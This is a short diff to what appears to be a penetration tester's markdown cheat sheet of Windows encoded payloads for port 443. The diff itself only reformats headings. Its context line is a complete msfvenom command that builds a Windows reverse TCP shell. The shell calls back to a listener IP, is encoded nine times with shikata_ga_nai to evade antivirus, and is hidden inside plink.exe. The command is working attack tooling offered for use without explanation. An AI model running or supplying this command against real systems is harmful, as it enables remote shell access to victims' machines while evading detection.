@@ -1,5 +1,5 @@
-## WINDOWS ENCODED PAYLOADS  PORT 443
-====CHANGE. IP. AS. NEEDED.====
+# WINDOWS ENCODED PAYLOADS  PORT 443
+**====CHANGE. IP. AS. NEEDED.====**
 
 ## WINDOWS/SHELL/REVERSE_TCP [PORT 443]
 msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
